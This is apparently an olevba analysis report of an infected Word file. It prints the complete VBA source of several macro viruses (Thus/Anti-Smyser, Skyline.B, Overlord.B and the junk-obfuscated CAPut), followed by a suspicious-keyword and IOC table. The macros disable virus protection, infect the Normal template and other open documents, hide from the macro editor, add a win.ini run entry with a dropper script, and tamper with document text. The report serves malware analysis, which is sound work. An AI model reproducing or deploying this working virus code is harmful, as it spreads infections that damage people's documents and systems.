olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus-based-eef3a447cede8cbc67c93d1226fbbb60f351344d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus-based-eef3a447cede8cbc67c93d1226fbbb60f351344d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'Thus_001'
'Anti-Smyser'
' This virus is an alteration of a virus which was
' designed to delete all files from one's C: drive on Dec 13th.
' This code is completely benign.
    On Error Resume Next
    Application.Options.VirusProtection = False
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) <> "'Anti-Smyser'" Then
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
        .DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1) _
        .CodeModule.CountOfLines
    End If
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
        .InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1) _
        .CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents _
        .Item(1).CodeModule.CountOfLines)
    End If
    If NormalTemplate.Saved = False Then NormalTemplate.Save
    
    For k = 1 To Application.Documents.Count
        If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) <> "'Anti-Smyser'" Then
            Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
            .CodeModule.DeleteLines 1, Application.Documents.Item(k) _
            .VBProject.VBComponents.Item(1).CodeModule.CountOfLines
        End If
        If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
            Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
            .CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents _
            .Item(1).CodeModule.Lines(1, NormalTemplate.VBProject _
            .VBComponents.Item(1).CodeModule.CountOfLines)
        End If
    Next k
End Sub
Private Sub Document_Close()
    Document_Open
End Sub
Private Sub Document_New()
    Document_Open
End Sub






























































































-------------------------------------------------------------------------------
VBA MACRO Skyline.bas 
in file: Virus.MSWord.Thus-based-eef3a447cede8cbc67c93d1226fbbb60f351344d - OLE stream: 'Macros/VBA/Skyline'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Name - W97M/Skyline.B
'Author - [Bench]
Dim DeleteMe As Boolean
Sub AutoOpen()
On Error Resume Next
SetAttr NormalTemplate.FullName, vbNormal
If Application.ShowVisualBasicEditor = True Then _
    Application.ShowVisualBasicEditor = False
Call BenchCore
End Sub
Sub ViewVBCode()
On Error Resume Next
DeleteMe = True
With Assistant.NewBalloon
    .Icon = msoIconAlert
    .Heading = "Skyline MV"
    .Text = "You thought you got rid of me, but I'm Still here, better and stronger!"
    .Animation = msoAnimationGreeting
    .Show
End With
Call BenchCore
'Application.ShowVisualBasicEditor = True
End Sub
Sub ToolsMacro()
On Error Resume Next
DeleteMe = True
'Dialogs(wdDialogToolsMacro).Show
End Sub
Sub ToolsCustomize()
On Error Resume Next
DeleteMe = True
End Sub
Sub ViewSecurity()
On Error Resume Next
MsgBox "Access is Restricted!", vbCritical, "Microsoft Word"
End Sub
Sub BenchCore()
On Error Resume Next
ModulName = "Skyline"
FileName = "ascii.vxd"
If MacroContainer = NormalTemplate Then
Set Carrier = NormalTemplate.VBProject.VBComponents
Set host = ActiveDocument.VBProject.VBComponents
Else
Set Carrier = ActiveDocument.VBProject.VBComponents
Set host = NormalTemplate.VBProject.VBComponents
End If
If host(ModulName).Name <> ModulName Then
Carrier(ModulName).Export "c:\ascii.vxd"
host.import ("c:\ascii.vxd")
End If
If ActiveDocument.Content.Characters.Count = 0 Then ActiveDocument.Saved = True Else ActiveDocument.Save
End Sub
-------------------------------------------------------------------------------
VBA MACRO Module.bas 
in file: Virus.MSWord.Thus-based-eef3a447cede8cbc67c93d1226fbbb60f351344d - OLE stream: 'Macros/VBA/Module'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()

'MyName = Overlord
'WrittenBy = f0re [UC/Skamwerks/DVC]
'Version = .B (1.1)

On Error Resume Next

windir = Environ("windir")
If Dir(windir & "\tempad.dll") <> "" Then Kill (windir & "\tempad.dll")
If Dir(windir & "\tempnt.dll") <> "" Then Kill (windir & "\tempnt.dll")

Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False

If NormalTemplate.VBProject.VBComponents.Item("Module").CodeModule.Lines(3, 1) <> "'MyName = Overlord" Then
ActiveDocument.VBProject.VBComponents("Module").Export (windir & "\tempad.dll")
NormalTemplate.VBProject.VBComponents.import (windir & "\tempad.dll")
NormalTemplate.Save
End If
If ActiveDocument.VBProject.VBComponents.Item("Module").CodeModule.Lines(3, 1) <> "'MyName = Overlord" Then
NormalTemplate.VBProject.VBComponents("Module").Export (windir & "\tempnt.dll")
ActiveDocument.VBProject.VBComponents.import (windir & "\tempnt.dll")
ActiveDocument.SaveAs ActiveDocument.FullName
End If

If Dir("c:\Himem.sys") <> "" Then
Open "c:\Himem.sys" For Input As #1
Open "c:\Himem.sy_" For Output As #2
Do While Not EOF(1)
 Input #1, Line
 If Line <> ActiveDocument.FullName Then Print #2, Line
Loop
Close #1
Close #2

Kill ("c:\Himem.sys")
FileCopy "c:\Himem.sy_", "c:\Himem.sys"
Kill ("c:\Himem.sy_")
End If

End Sub
Sub AutoOpen()

On Error Resume Next
windir = Environ("windir")

Open "c:\Himem.sys" For Append As #1
Print #1, ActiveDocument.FullName
Close #1

End Sub

Sub Stealth()
On Error Resume Next

windir = Environ("windir")

System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\software\", "RegisteredOwner") = "the Overlord"

Open windir & "\win.ini" For Input As #1
Open "c:\win._ni" For Output As #2
Do While Not EOF(1)
 Line Input #1, Line
 If Line = "[windows]" Then
  Print #2, Line
  Print #2, "run = " & windir & "\overlord.b.vbs"
 Else
  Print #2, Line
 End If
Loop
Close #1
Close #2

FileCopy "c:\win._ni", windir & "\win.ini"
Kill ("c:\win._ni")

If Dir(windir & "\overlord.b.vbs") <> "" Then Kill (windir & "\overlord.b.vbs")

Open "c:\windows\overlord.b.vbs" For Append As #1
Print #1, "On error resume next"
Print #1, ""
Print #1, "Set WordObj = CreateObject(" & Chr(34) & "Word.Application" & Chr(34) & ")"
Print #1, "WordObj.Options.SaveNormalPrompt = False"
Print #1, "WordObj.NormalTemplate.VBProject.VBComponents.remove WordObj.NormalTemplate.VBProject.VBComponents(" & Chr(34) & "Module" & Chr(34) & ")"
Print #1, "WordObj.NormalTemplate.save"
Print #1, "WordObj.NormalTemplate.VBProject.VBComponents.import (" & Chr(34) & windir & "\overlord.b.dll" & Chr(34) & ")"
Print #1, "WordObj.NormalTemplate.save"
Print #1, ""
Print #1, "Dim FSO"
Print #1, "Set FSO = CreateObject(" & Chr(34) & "Scripting.FileSystemObject" & Chr(34) & ")"
Print #1, "set a =  FSO.OpenTextFile(" & Chr(34) & "c:\himem.sys" & Chr(34) & ", 1, True)"
Print #1, "contents = a.readall()"
Print #1, "a.close"
Print #1, "set b =  FSO.OpenTextFile(" & Chr(34) & "c:\himem.dll" & Chr(34) & ", 2, True)"
Print #1, "b.write(contents)"
Print #1, "b.close"
Print #1, "set a =  FSO.OpenTextFile(" & Chr(34) & "c:\himem.dll" & Chr(34) & ", 1, True)"
Print #1, "Do While a.atendofstream <> True"
Print #1, "documentname = a.readline"
Print #1, "If documentname <> " & Chr(34) & Chr(34) & " then"
Print #1, "WordObj.Documents.open (documentname)"
Print #1, "WordObj.activedocument.save"
Print #1, "WordObj.activedocument.close"
Print #1, "End if"
Print #1, "Loop"
Print #1, "a.close"
Print #1, "set NT = " & Chr(34) & Chr(34)
Print #1, "WordObj.Quit"
Print #1, "fso.deletefile" & Chr(34) & "c:\himem.sys" & Chr(34)
Print #1, "fso.deletefile" & Chr(34) & "c:\himem.dll" & Chr(34)
Close #1

NormalTemplate.VBProject.VBComponents("Module").Export (windir & "\overlord.b.dll")

End Sub
Sub ViewVBCode()
On Error Resume Next

Call Stealth

NormalTemplate.VBProject.VBComponents("Module").CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents("Module").CodeModule.CountOfLines
NormalTemplate.Saved = True
NormalTemplate.VBProject.VBComponents.Remove NormalTemplate.VBProject.VBComponents("Module")
NormalTemplate.Saved = True

Docnumber = Application.Documents.Count
If Docnumber >= 1 Then
For x = 1 To Docnumber
Documents(x).VBProject.VBComponents("Module").CodeModule.DeleteLines 1, Documents(x).VBProject.VBComponents("Module").CodeModule.CountOfLines
Documents(x).Saved = True
Documents(x).VBProject.VBComponents.Remove Documents(x).VBProject.VBComponents("Module")
Documents(x).Saved = True
Next x
End If

Application.ShowVisualBasicEditor = True

End Sub
Sub ToolsMacro()
On Error Resume Next

For x = 1 To NormalTemplate.VBProject.VBComponents("Module").CodeModule.CountOfLines
 codeNT = codeNT & NormalTemplate.VBProject.VBComponents("Module").CodeModule.Lines(x, 1) & Chr(13)
Next x
NormalTemplate.VBProject.VBComponents("Module").CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents("Module").CodeModule.CountOfLines
NormalTemplate.Saved = True

Docnumber = Application.Documents.Count
If Docnumber >= 1 Then
 For y = 1 To ActiveDocument.VBProject.VBComponents("Module").CodeModule.CountOfLines
  CodeAD = CodeAD & ActiveDocument.VBProject.VBComponents("Module").CodeModule.Lines(y, 1) & Chr(13)
 Next y
 For x = 1 To Docnumber
 Documents(x).VBProject.VBComponents("Module").CodeModule.DeleteLines 1, Documents(x).VBProject.VBComponents("Module").CodeModule.CountOfLines
 Documents(x).Saved = True
 Next x
End If

Application.Dialogs(wdDialogToolsMacro).Show

If Application.ShowVisualBasicEditor = False Then
 NormalTemplate.VBProject.VBComponents("Module").CodeModule.InsertLines 1, codeNT
 NormalTemplate.Save
 
If Docnumber >= 1 Then
For x = 1 To Docnumber
Documents(x).VBProject.VBComponents("Module").CodeModule.InsertLines 1, CodeAD
Documents(x).SaveAs Documents(x).FullName
Next x
End If
End If
End Sub

'Put this code in a module called "Module". This is another version of overlord.
'It uses a different stealth mechanism. Again however not perfect stealth,
'but perhaps also a nice attempt i hope :).




-------------------------------------------------------------------------------
VBA MACRO CAPut.bas 
in file: Virus.MSWord.Thus-based-eef3a447cede8cbc67c93d1226fbbb60f351344d - OLE stream: 'Macros/VBA/CAPut'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Sub CAPut()
    
    ' CAPut! by --=|| N|c0t|N ||=-- 1998
    
On Error Resume Next
Randomize
JfAu17433 = RqNsDnSz & EoEj6923 & AwBfAgHz & KiQo8644
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
ActiveDocument.VBProject.VBComponents("CAPut").Export "c:\system.drv"
ActiveDocument.ReadOnlyRecommended = False
PrMtOwNl = IgVz9625 & BiNh12935
CeVy15065 = PyKqDtEs & HuEu16043 & Int(Rnd * 7636)
JeOl = Int(Rnd * 100)
If JeOl = 3 Then Call AjMe9259LhSk
MqMz4946 = OuUlOyNl & PiAi4810 & Int(Rnd * 3652)
ClEj447 = LvPsPeKm & HxHj15520 & Int(Rnd * 221)
NgBqLwKf = GwMq13887 & SxHt6069
With Dialogs(wdDialogFileSummaryInfo)
    .Comments = "JU$t bEEn CAPuted!"
    .Execute
End With
CqMh5411 = EgCnTsQx & KqVy10676 & Int(Rnd * 9204)
If NormalTemplate.VBProject.VBComponents.Item("CAPut").Name <> "CAPut" Then AkCk84703417 = True
PgCr9803 = UiQuDhKk & BiEu7803 & Int(Rnd * 9188)
RtIhCrLj = QoEo9298 & BfVo9019
If ActiveDocument.VBProject.VBComponents.Item("CAPut").Name <> "CAPut" Then MrJm3419 = True
NzCsBeMr = CmNx10042 & UoUi1996
LsNmIwHu = EqDi18147 & NqBj9202
If AkCk84703417 = True And MrJm3419 = False Then Set DvIe341847012 = NormalTemplate.VBProject.VBComponents
If AkCk84703417 = False And MrJm3419 = True Then Set DvIe341847012 = ActiveDocument.VBProject.VBComponents
DvIe341847012.import "c:\system.drv"
CmHnCnSp = JtMn14474 & OhVn11869
OsNuSmMo = BeTi8996 & UhHo8214
If activeinst = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
QeRg10393 = FoIpGwJe & JwMp9412 & Int(Rnd * 5044)
AzSp15416 = UwBxExUt & IkFo5185 & NmTiGxVk & LxDe11126
If MrJm3419 = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
HfUvIjIe = SnOs13009 & JuQg10355
NsGhGfPm = GtSq14068 & VfAy5029
EsFiDzTx:
End Sub
Sub HelpAbout()
    On Error Resume Next
BuNr7381 = LiGpQjRr & GnJp10814 & KvCpCuCo & KwRk6617
    MsgBox "CAPut!  by --=|| N|c0t|N ||=-- (c) 1998", vbInformation
IlCr16749 = MxGoDtAk & TrUm12168 & FsFkHxUn & DwAv11295
End Sub
Sub FileSave()
    On Error Resume Next
LiReDfMf = EnKh8330 & QuPp8162
    Call CAPut
OiEmAoOl = VmVv8905 & AePg13070
    ActiveDocument.Save
KyIjRuNw = JyFr9740 & QqGi11191
OrIl7155 = BhEyNeSt & SiRw7417 & Int(Rnd * 1353)
End Sub
Sub FileSaveAs()
    On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
UeVq8762 = LeTwLhTq & PsKl9343 & Int(Rnd * 7036)
JtHwAfJv = ChBu12592 & LoJf11295
    Call CAPut
IfFmUpFg = NuPl7936 & HwCr13540
End Sub
Sub AutoOpen()
    On Error Resume Next
QlFo19630 = NsUmEiSq & JqFp460 & QlKxAqIw & UgVh7676
    Call CAPut
End Sub
Sub AutoClose()
    On Error Resume Next
HjStSfFo = AxOm6853 & GhDr14428
    Call CAPut
DoHt2929 = RfIqPmPe & SeCo13071 & Int(Rnd * 686)
HvOn9750 = NwJrQzJx & ChJe11694 & Int(Rnd * 4012)
End Sub
Sub ToolsMacro()
    On Error Resume Next
CyRo9000 = NlUkNsBj & BuRm11812 & MjNsGuFv & MhEs2356
    Call CAPut
HqHp4787 = VpBwNkEm & AoRl6538 & JkAzLeSj & DxIp5806
CjAv14381 = JjDmDzHz & BxUx11288 & Int(Rnd * 6172)
FvIpPfCh = UqFz11115 & BwTh7561
MsgBox "Word Basic Err =7"
TfAq15178 = SpAnDmRe & AiUo2717 & Int(Rnd * 7401)
End Sub
Sub FileTemplates()
    On Error Resume Next
MmSmVuQh = LjOe15478 & VxNs8057
OzTu6393 = JmPvLnFj & TyKw8465 & MnMqQqCj & QqDm16199
    Call CAPut
LhTh9643 = EzTjDpBl & IoUx9530 & PtJnVeFi & JuNt13020
AoBfPfOk = RzUe14069 & EwLt12905
CeVkJnOj = KsAk8906 & FvEx10947
MsgBox "Word Basic Err =7"
PtNe5508 = MmBpNxEl & OoOr13476 & PzCuIqEr & UgJz12108
End Sub
Sub ViewVBCode()
    On Error Resume Next
QjMpPxDw = PqOp10698 & JlBx6379
CfAi13770 = KfUoFuHl & DqCk11244 & Int(Rnd * 8128)
    Call CAPut
OuIhRfOn = IzQv14238 & RzLw10974
EqMm11281 = GjGhPjBs & OkUj9131 & OsMpOnUu & AjAk10214
MsgBox "Word Basic Err =7"
JlIy4686 = UoHuRxHt & SnFm13906 & Int(Rnd * 7980)
End Sub
Sub AjMe9259LhSk()
    On Error Resume Next
FzVh10936 = RfOlAkMn & MoEf14498 & TuSlVpVw & DqRn10462
RmRjIyOi = OsCx3822 & UtEv11914
        Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .Text = "19"
            .Replacement.Text = "CAPut!'"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
LhGsIuCt = MjTm10450 & DiQy15385
KiQuVgUl = DsNj9548 & UwDs6561
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
KnMm8959 = NmKwMrLu & QoHs9797 & BeOoEjVl & PzMr9627
CommandBars("edit").Controls("Replace...").Delete
InHl11520 = IrHrQuFl & AnFk11599 & Int(Rnd * 6442)
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |tempad.dll          |Executable file name                         |
|IOC       |tempnt.dll          |Executable file name                         |
|IOC       |b.vbs               |Executable file name                         |
|IOC       |b.dll               |Executable file name                         |
|IOC       |himem.dll           |Executable file name                         |
+----------+--------------------+---------------------------------------------+

